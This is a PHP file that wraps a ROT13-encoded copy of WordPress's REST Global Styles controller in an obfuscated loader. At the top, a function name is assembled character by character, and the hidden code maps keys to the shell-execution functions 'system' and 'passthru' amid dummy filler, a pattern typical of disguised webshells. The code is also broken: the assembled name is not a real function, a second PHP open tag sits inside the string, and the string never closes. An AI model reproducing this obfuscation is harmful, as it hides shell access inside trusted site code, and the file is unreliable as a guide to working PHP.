<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Tybony_Fglyrf_Pbagebyyre pynff
 *
 * @cnpxntr    JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 */

/**
 * Onfr Tybony Fglyrf ERFG NCV Pbagebyyre.
 */
pynff JC_ERFG_Tybony_Fglyrf_Pbagebyyre rkgraqf JC_ERFG_Cbfgf_Pbagebyyre {
	/**
	 * Jurgure gur pbagebyyre fhccbegf ongpuvat.
	 *
	 * @fvapr 6.6.0
	 * @ine neenl
	 */
	cebgrpgrq $nyybj_ongpu = neenl( 'i1' => snyfr );

	/**
	 * Pbafgehpgbe.
	 *
	 * @fvapr 6.6.0
	 *
	 * @cnenz fgevat $cbfg_glcr Cbfg glcr.
	 */
	choyvp shapgvba __pbafgehpg( $cbfg_glcr = 'jc_tybony_fglyrf' ) {
		cnerag::__pbafgehpg( $cbfg_glcr );
	}

	/**
	 * Ertvfgref gur pbagebyyref ebhgrf.
	 *
	 * @fvapr 5.9.0
	 */
	choyvp shapgvba ertvfgre_ebhgrf() {
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/gurzrf/(?C<fglyrfurrg>[\/\f%\j\.\(\)\[\]\@_\-]+)/inevngvbaf',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_gurzr_vgrzf' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_gurzr_vgrzf_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'fglyrfurrg' => neenl(
							'qrfpevcgvba' => __( 'Gur gurzr vqragvsvre' ),
							'glcr'        => 'fgevat',
						),
					),
					'nyybj_ongpu'         => $guvf->nyybj_ongpu,
				),
			)
		);

		// Yvfg gurzrf tybony fglyrf.
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			// Gur ebhgr.
			fcevags(
				'/%f/gurzrf/(?C<fglyrfurrg>%f)',
				$guvf->erfg_onfr,
				/*
				 * Zngpurf gurzr'f qverpgbel: `/gurzrf/<fhoqverpgbel>/<gurzr>/` be `/gurzrf/<gurzr>/`.
				 * Rkpyhqrf vainyvq qverpgbel anzr punenpgref: `/:<>*?\"|`.
				 */
				'[^\/:<>\*\?\"\|]+(?:\/[^\/:<>\*\?\"\|]+)?'
			),
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_gurzr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_gurzr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'fglyrfurrg' => neenl(
							'qrfpevcgvba'       => __( 'Gur gurzr vqragvsvre' ),
							'glcr'              => 'fgevat',
							'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_tybony_fglyrf_pnyyonpx' ),
						),
					),
					'nyybj_ongpu'         => $guvf->nyybj_ongpu,
				),
			)
		);

		// Yvfgf/hcqngrf n fvatyr tybony fglyr inevngvba onfrq ba gur tvira vq.
		ertvfgre_erfg_ebhgr(
			$guvf->anzrfcnpr,
			'/' . $guvf->erfg_onfr . '/(?C<vq>[\/\j-]+)',
			neenl(
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::ERNQNOYR,
					'pnyyonpx'            => neenl( $guvf, 'trg_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'trg_vgrz_crezvffvbaf_purpx' ),
					'netf'                => neenl(
						'vq' => neenl(
							'qrfpevcgvba'       => __( 'Gur vq bs n grzcyngr' ),
							'glcr'              => 'fgevat',
							'fnavgvmr_pnyyonpx' => neenl( $guvf, '_fnavgvmr_tybony_fglyrf_pnyyonpx' ),
						),
					),
				),
				neenl(
					'zrgubqf'             => JC_ERFG_Freire::RQVGNOYR,
					'pnyyonpx'            => neenl( $guvf, 'hcqngr_vgrz' ),
					'crezvffvba_pnyyonpx' => neenl( $guvf, 'hcqngr_vgrz_crezvffvbaf_purpx' ),
					'netf'                => $guvf->trg_raqcbvag_netf_sbe_vgrz_fpurzn( JC_ERFG_Freire::RQVGNOYR ),
				),
				'fpurzn'      => neenl( $guvf, 'trg_choyvp_vgrz_fpurzn' ),
				'nyybj_ongpu' => $guvf->nyybj_ongpu,
			)
		);
	}

	/**
	 * Fnavgvmr gur tybony fglyrf VQ be fglyrfurrg gb qrpbqr raqcbvag.
	 * Sbe rknzcyr, `jc/i2/tybony-fglyrf/gjraglgjraglgjb%200.4.0`
	 * jbhyq or qrpbqrq gb `gjraglgjraglgjb 0.4.0`.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz fgevat $vq_be_fglyrfurrg Tybony fglyrf VQ be fglyrfurrg.
	 * @erghea fgevat Fnavgvmrq tybony fglyrf VQ be fglyrfurrg.
	 */
	choyvp shapgvba _fnavgvmr_tybony_fglyrf_pnyyonpx( $vq_be_fglyrfurrg ) {
		erghea heyqrpbqr( $vq_be_fglyrfurrg );
	}

	/**
	 * Trg gur cbfg, vs gur VQ vf inyvq.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag $vq Fhccyvrq VQ.
	 * @erghea JC_Cbfg|JC_Reebe Cbfg bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_cbfg( $vq ) {
		$reebe = arj JC_Reebe(
			'erfg_tybony_fglyrf_abg_sbhaq',
			__( 'Ab tybony fglyrf pbasvt rkvfg jvgu gung vq.' ),
			neenl( 'fgnghf' => 404 )
		);

		$vq = (vag) $vq;
		vs ( $vq <= 0 ) {
			erghea $reebe;
		}

		$cbfg = trg_cbfg( $vq );
		vs ( rzcgl( $cbfg ) || rzcgl( $cbfg->VQ ) || $guvf->cbfg_glcr !== $cbfg->cbfg_glcr ) {
			erghea $reebe;
		}

		erghea $cbfg;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n fvatyr tybony fglyr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		vs ( 'rqvg' === $erdhrfg['pbagrkg'] && $cbfg && ! $guvf->purpx_hcqngr_crezvffvba( $cbfg ) ) {
			erghea arj JC_Reebe(
				'erfg_sbeovqqra_pbagrkg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf tybony fglyr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		vs ( ! $guvf->purpx_ernq_crezvffvba( $cbfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_ivrj',
				__( 'Fbeel, lbh ner abg nyybjrq gb ivrj guvf tybony fglyr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Purpxf vs n tybony fglyr pna or ernq.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea obby Jurgure gur cbfg pna or ernq.
	 */
	choyvp shapgvba purpx_ernq_crezvffvba( $cbfg ) {
		erghea pheerag_hfre_pna( 'ernq_cbfg', $cbfg->VQ );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb jevgr n fvatyr tybony fglyrf pbasvt.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf jevgr npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba hcqngr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$cbfg = $guvf->trg_cbfg( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $cbfg ) ) {
			erghea $cbfg;
		}

		vs ( $cbfg && ! $guvf->purpx_hcqngr_crezvffvba( $cbfg ) ) {
			erghea arj JC_Reebe(
				'erfg_pnaabg_rqvg',
				__( 'Fbeel, lbh ner abg nyybjrq gb rqvg guvf tybony fglyr.' ),
				neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
			);
		}

		erghea gehr;
	}

	/**
	 * Cercnerf n fvatyr tybony fglyrf pbasvt sbe hcqngr.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.2.0 Nqqrq inyvqngvba bs fglyrf.pff cebcregl.
	 * @fvapr 6.6.0 Nqqrq ertvfgengvba bs oybpx fglyr inevngvbaf sebz gurzr.wfba fbheprf (gurzr.wfba, hfre gurzr.wfba, cnegvnyf).
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea fgqPynff|JC_Reebe Cercnerq vgrz ba fhpprff. JC_Reebe ba jura gur phfgbz PFF vf abg inyvq.
	 */
	cebgrpgrq shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$punatrf     = arj fgqPynff();
		$punatrf->VQ = $erdhrfg['vq'];

		$cbfg            = trg_cbfg( $erdhrfg['vq'] );
		$rkvfgvat_pbasvt = neenl();
		vs ( $cbfg ) {
			$rkvfgvat_pbasvt     = wfba_qrpbqr( $cbfg->cbfg_pbagrag, gehr );
			$wfba_qrpbqvat_reebe = wfba_ynfg_reebe();
			vs ( WFBA_REEBE_ABAR !== $wfba_qrpbqvat_reebe || ! vffrg( $rkvfgvat_pbasvt['vfTybonyFglyrfHfreGurzrWFBA'] ) ||
				! $rkvfgvat_pbasvt['vfTybonyFglyrfHfreGurzrWFBA'] ) {
				$rkvfgvat_pbasvt = neenl();
			}
		}

		vs ( vffrg( $erdhrfg['fglyrf'] ) || vffrg( $erdhrfg['frggvatf'] ) ) {
			$pbasvt = neenl();
			vs ( vffrg( $erdhrfg['fglyrf'] ) ) {
				vs ( vffrg( $erdhrfg['fglyrf']['pff'] ) ) {
					$pff_inyvqngvba_erfhyg = $guvf->inyvqngr_phfgbz_pff( $erdhrfg['fglyrf']['pff'] );
					vs ( vf_jc_reebe( $pff_inyvqngvba_erfhyg ) ) {
						erghea $pff_inyvqngvba_erfhyg;
					}
				}
				$pbasvt['fglyrf'] = $erdhrfg['fglyrf'];
			} ryfrvs ( vffrg( $rkvfgvat_pbasvt['fglyrf'] ) ) {
				$pbasvt['fglyrf'] = $rkvfgvat_pbasvt['fglyrf'];
			}

			// Ertvfgre gurzr-qrsvarq inevngvbaf r.t. sebz oybpx fglyr inevngvba cnegvnyf haqre `/fglyrf`.
			$inevngvbaf = JC_Gurzr_WFBA_Erfbyire::trg_fglyr_inevngvbaf( 'oybpx' );
			jc_ertvfgre_oybpx_fglyr_inevngvbaf_sebz_gurzr_wfba_cnegvnyf( $inevngvbaf );

			vs ( vffrg( $erdhrfg['frggvatf'] ) ) {
				$pbasvt['frggvatf'] = $erdhrfg['frggvatf'];
			} ryfrvs ( vffrg( $rkvfgvat_pbasvt['frggvatf'] ) ) {
				$pbasvt['frggvatf'] = $rkvfgvat_pbasvt['frggvatf'];
			}
			$pbasvt['vfTybonyFglyrfHfreGurzrWFBA'] = gehr;
			$pbasvt['irefvba']                     = JC_Gurzr_WFBA::YNGRFG_FPURZN;
			$punatrf->cbfg_pbagrag                 = jc_wfba_rapbqr( $pbasvt );
		}

		// Cbfg gvgyr.
		vs ( vffrg( $erdhrfg['gvgyr'] ) ) {
			vs ( vf_fgevat( $erdhrfg['gvgyr'] ) ) {
				$punatrf->cbfg_gvgyr = $erdhrfg['gvgyr'];
			} ryfrvs ( ! rzcgl( $erdhrfg['gvgyr']['enj'] ) ) {
				$punatrf->cbfg_gvgyr = $erdhrfg['gvgyr']['enj'];
			}
		}

		erghea $punatrf;
	}

	/**
	 * Cercner n tybony fglyrf pbasvt bhgchg sbe erfcbafr.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.6.0 Nqqrq phfgbz eryngvir gurzr svyr HEVf gb `_yvaxf`.
	 *
	 * @cnenz JC_Cbfg         $cbfg    Tybony Fglyrf cbfg bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $cbfg, $erdhrfg ) {
		$enj_pbasvt                       = wfba_qrpbqr( $cbfg->cbfg_pbagrag, gehr );
		$vf_tybony_fglyrf_hfre_gurzr_wfba = vffrg( $enj_pbasvt['vfTybonyFglyrfHfreGurzrWFBA'] ) && gehr === $enj_pbasvt['vfTybonyFglyrfHfreGurzrWFBA'];
		$pbasvt                           = neenl();
		$gurzr_wfba                       = ahyy;
		vs ( $vf_tybony_fglyrf_hfre_gurzr_wfba ) {
			$gurzr_wfba = arj JC_Gurzr_WFBA( $enj_pbasvt, 'phfgbz' );
			$pbasvt     = $gurzr_wfba->trg_enj_qngn();
		}

		// Onfr svryqf sbe rirel cbfg.
		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'vq', $svryqf ) ) {
			$qngn['vq'] = $cbfg->VQ;
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr', $svryqf ) ) {
			$qngn['gvgyr'] = neenl();
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr.enj', $svryqf ) ) {
			$qngn['gvgyr']['enj'] = $cbfg->cbfg_gvgyr;
		}
		vs ( erfg_vf_svryq_vapyhqrq( 'gvgyr.eraqrerq', $svryqf ) ) {
			nqq_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			nqq_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );

			$qngn['gvgyr']['eraqrerq'] = trg_gur_gvgyr( $cbfg->VQ );

			erzbir_svygre( 'cebgrpgrq_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
			erzbir_svygre( 'cevingr_gvgyr_sbezng', neenl( $guvf, 'cebgrpgrq_gvgyr_sbezng' ) );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'frggvatf', $svryqf ) ) {
			$qngn['frggvatf'] = ! rzcgl( $pbasvt['frggvatf'] ) && $vf_tybony_fglyrf_hfre_gurzr_wfba ? $pbasvt['frggvatf'] : arj fgqPynff();
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fglyrf', $svryqf ) ) {
			$qngn['fglyrf'] = ! rzcgl( $pbasvt['fglyrf'] ) && $vf_tybony_fglyrf_hfre_gurzr_wfba ? $pbasvt['fglyrf'] : arj fgqPynff();
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $cbfg->VQ );

			// Bayl erghea erfbyirq HEVf sbe trg erdhrfgf gb hfre gurzr WFBA.
			vs ( $gurzr_wfba ) {
				$erfbyirq_gurzr_hevf = JC_Gurzr_WFBA_Erfbyire::trg_erfbyirq_gurzr_hevf( $gurzr_wfba );
				vs ( ! rzcgl( $erfbyirq_gurzr_hevf ) ) {
					$yvaxf['uggcf://ncv.j.bet/gurzr-svyr'] = $erfbyirq_gurzr_hevf;
				}
			}

			$erfcbafr->nqq_yvaxf( $yvaxf );
			vs ( ! rzcgl( $yvaxf['frys']['uers'] ) ) {
				$npgvbaf = $guvf->trg_ninvynoyr_npgvbaf( $cbfg, $erdhrfg );
				$frys    = $yvaxf['frys']['uers'];
				sbernpu ( $npgvbaf nf $ery ) {
					$erfcbafr->nqq_yvax( $ery, $frys );
				}
			}
		}

		erghea $erfcbafr;
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.3.0 Nqqf erivfvbaf pbhag naq erfg HEY uers gb irefvba-uvfgbel.
	 *
	 * @cnenz vagrtre $vq VQ.
	 * @erghea neenl Yvaxf sbe gur tvira cbfg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $vq ) {
		$onfr = fcevags( '%f/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr );

		$yvaxf = neenl(
			'frys'  => neenl(
				'uers' => erfg_hey( genvyvatfynfuvg( $onfr ) . $vq ),
			),
			'nobhg' => neenl(
				'uers' => erfg_hey( 'jc/i2/glcrf/' . $guvf->cbfg_glcr ),
			),
		);

		vs ( cbfg_glcr_fhccbegf( $guvf->cbfg_glcr, 'erivfvbaf' ) ) {
			$erivfvbaf                = jc_trg_yngrfg_erivfvba_vq_naq_gbgny_pbhag( $vq );
			$erivfvbaf_pbhag          = ! vf_jc_reebe( $erivfvbaf ) ? $erivfvbaf['pbhag'] : 0;
			$erivfvbaf_onfr           = fcevags( '/%f/%q/erivfvbaf', $onfr, $vq );
			$yvaxf['irefvba-uvfgbel'] = neenl(
				'uers'  => erfg_hey( $erivfvbaf_onfr ),
				'pbhag' => $erivfvbaf_pbhag,
			);
		}

		erghea $yvaxf;
	}

	/**
	 * Trg gur yvax eryngvbaf ninvynoyr sbe gur cbfg naq pheerag hfre.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.2.0 Nqqrq 'rqvg-pff' npgvba.
	 * @fvapr 6.6.0 Nqqrq $cbfg naq $erdhrfg cnenzrgref.
	 *
	 * @cnenz JC_Cbfg         $cbfg    Cbfg bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea neenl Yvfg bs yvax eryngvbaf.
	 */
	cebgrpgrq shapgvba trg_ninvynoyr_npgvbaf( $cbfg, $erdhrfg ) {
		$eryf = neenl();

		$cbfg_glcr = trg_cbfg_glcr_bowrpg( $cbfg->cbfg_glcr );
		vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->choyvfu_cbfgf ) ) {
			$eryf[] = 'uggcf://ncv.j.bet/npgvba-choyvfu';
		}

		vs ( pheerag_hfre_pna( 'rqvg_pff' ) ) {
			$eryf[] = 'uggcf://ncv.j.bet/npgvba-rqvg-pff';
		}

		erghea $eryf;
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur tybony fglyrf pbyyrpgvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		erghea neenl();
	}

	/**
	 * Ergevrirf gur tybony fglyrf glcr' fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => $guvf->cbfg_glcr,
			'glcr'       => 'bowrpg',
			'cebcregvrf' => neenl(
				'vq'       => neenl(
					'qrfpevcgvba' => __( 'VQ bs tybony fglyrf pbasvt.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'ernqbayl'    => gehr,
				),
				'fglyrf'   => neenl(
					'qrfpevcgvba' => __( 'Tybony fglyrf.' ),
					'glcr'        => neenl( 'bowrpg' ),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'frggvatf' => neenl(
					'qrfpevcgvba' => __( 'Tybony frggvatf.' ),
					'glcr'        => neenl( 'bowrpg' ),
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'gvgyr'    => neenl(
					'qrfpevcgvba' => __( 'Gvgyr bs gur tybony fglyrf inevngvba.' ),
					'glcr'        => neenl( 'bowrpg', 'fgevat' ),
					'qrsnhyg'     => '',
					'pbagrkg'     => neenl( 'rzorq', 'ivrj', 'rqvg' ),
					'cebcregvrf'  => neenl(
						'enj'      => neenl(
							'qrfpevcgvba' => __( 'Gvgyr sbe gur tybony fglyrf inevngvba, nf vg rkvfgf va gur qngnonfr.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
						),
						'eraqrerq' => neenl(
							'qrfpevcgvba' => __( 'UGZY gvgyr sbe gur cbfg, genafsbezrq sbe qvfcynl.' ),
							'glcr'        => 'fgevat',
							'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
							'ernqbayl'    => gehr,
						),
					),
				),
			),
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n fvatyr gurzr tybony fglyrf pbasvt.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.7.0 Nyybj hfref jvgu rqvg cbfg pncnovyvgvrf gb ivrj gurzr tybony fglyrf.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_gurzr_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		/*
		 * Irevsl vs gur pheerag hfre unf rqvg_cbfgf pncnovyvgl.
		 * Guvf pncnovyvgl vf erdhverq gb ivrj tybony fglyrf.
		 */
		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}

		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		/*
		 * Irevsl vs gur pheerag hfre unf rqvg_gurzr_bcgvbaf pncnovyvgl.
		 */
		vs ( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea gehr;
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ernq_tybony_fglyrf',
			__( 'Fbeel, lbh ner abg nyybjrq gb npprff gur tybony fglyrf ba guvf fvgr.' ),
			neenl(
				'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr(),
			)
		);
	}

	/**
	 * Ergheaf gur tvira gurzr tybony fglyrf pbasvt.
	 *
	 * @fvapr 5.9.0
	 * @fvapr 6.6.0 Nqqrq phfgbz eryngvir gurzr svyr HEVf gb `_yvaxf`.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg vafgnapr.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe
	 */
	choyvp shapgvba trg_gurzr_vgrz( $erdhrfg ) {
		vs ( trg_fglyrfurrg() !== $erdhrfg['fglyrfurrg'] ) {
			// Guvf raqcbvag bayl fhccbegf gur npgvir gurzr sbe abj.
			erghea arj JC_Reebe(
				'erfg_gurzr_abg_sbhaq',
				__( 'Gurzr abg sbhaq.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$gurzr  = JC_Gurzr_WFBA_Erfbyire::trg_zretrq_qngn( 'gurzr' );
		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = neenl();

		vs ( erfg_vf_svryq_vapyhqrq( 'frggvatf', $svryqf ) ) {
			$qngn['frggvatf'] = $gurzr->trg_frggvatf();
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'fglyrf', $svryqf ) ) {
			$enj_qngn       = $gurzr->trg_enj_qngn();
			$qngn['fglyrf'] = vffrg( $enj_qngn['fglyrf'] ) ? $enj_qngn['fglyrf'] : neenl();
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf               = neenl(
				'frys' => neenl(
					'uers' => erfg_hey( fcevags( '%f/%f/gurzrf/%f', $guvf->anzrfcnpr, $guvf->erfg_onfr, $erdhrfg['fglyrfurrg'] ) ),
				),
			);
			$erfbyirq_gurzr_hevf = JC_Gurzr_WFBA_Erfbyire::trg_erfbyirq_gurzr_hevf( $gurzr );
			vs ( ! rzcgl( $erfbyirq_gurzr_hevf ) ) {
				$yvaxf['uggcf://ncv.j.bet/gurzr-svyr'] = $erfbyirq_gurzr_hevf;
			}
			$erfcbafr->nqq_yvaxf( $yvaxf );
		}

		erghea $erfcbafr;
	}

	/**
	 * Purpxf vs n tvira erdhrfg unf npprff gb ernq n fvatyr gurzr tybony fglyrf pbasvt.
	 *
	 * @fvapr 6.0.0
	 * @fvapr 6.7.0 Nyybj hfref jvgu rqvg cbfg pncnovyvgvrf gb ivrj gurzr tybony fglyrf.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, JC_Reebe bowrpg bgurejvfr.
	 */
	choyvp shapgvba trg_gurzr_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		erghea $guvf->trg_gurzr_vgrz_crezvffvbaf_purpx( $erdhrfg );
	}

	/**
	 * Ergheaf gur tvira gurzr tybony fglyrf inevngvbaf.
	 *
	 * @fvapr 6.0.0
	 * @fvapr 6.2.0 Ergheaf cnerag gurzr inevngvbaf, vs gurl rkvfg.
	 * @fvapr 6.6.0 Nqqrq phfgbz eryngvir gurzr svyr HEVf gb `_yvaxf` sbe rnpu vgrz.
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Gur erdhrfg vafgnapr.
	 *
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe
	 */
	choyvp shapgvba trg_gurzr_vgrzf( $erdhrfg ) {
		vs ( trg_fglyrfurrg() !== $erdhrfg['fglyrfurrg'] ) {
			// Guvf raqcbvag bayl fhccbegf gur npgvir gurzr sbe abj.
			erghea arj JC_Reebe(
				'erfg_gurzr_abg_sbhaq',
				__( 'Gurzr abg sbhaq.' ),
				neenl( 'fgnghf' => 404 )
			);
		}

		$erfcbafr = neenl();

		// Ertvfgre gurzr-qrsvarq inevngvbaf r.t. sebz oybpx fglyr inevngvba cnegvnyf haqre `/fglyrf`.
		$cnegvnyf = JC_Gurzr_WFBA_Erfbyire::trg_fglyr_inevngvbaf( 'oybpx' );
		jc_ertvfgre_oybpx_fglyr_inevngvbaf_sebz_gurzr_wfba_cnegvnyf( $cnegvnyf );

		$inevngvbaf = JC_Gurzr_WFBA_Erfbyire::trg_fglyr_inevngvbaf();
		sbernpu ( $inevngvbaf nf $inevngvba ) {
			$inevngvba_gurzr_wfba = arj JC_Gurzr_WFBA( $inevngvba );
			$erfbyirq_gurzr_hevf  = JC_Gurzr_WFBA_Erfbyire::trg_erfbyirq_gurzr_hevf( $inevngvba_gurzr_wfba );
			$qngn                 = erfg_rafher_erfcbafr( $inevngvba );
			vs ( ! rzcgl( $erfbyirq_gurzr_hevf ) ) {
				$qngn->nqq_yvaxf(
					neenl(
						'uggcf://ncv.j.bet/gurzr-svyr' => $erfbyirq_gurzr_hevf,
					)
				);
			}
			$erfcbafr[] = $guvf->cercner_erfcbafr_sbe_pbyyrpgvba( $qngn );
		}

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Inyvqngr fglyr.pff nf inyvq PFF.
	 *
	 * Pheeragyl whfg purpxf sbe vainyvq znexhc.
	 *
	 * @fvapr 6.2.0
	 * @fvapr 6.4.0 Punatrq zrgubq ivfvovyvgl gb cebgrpgrq.
	 *
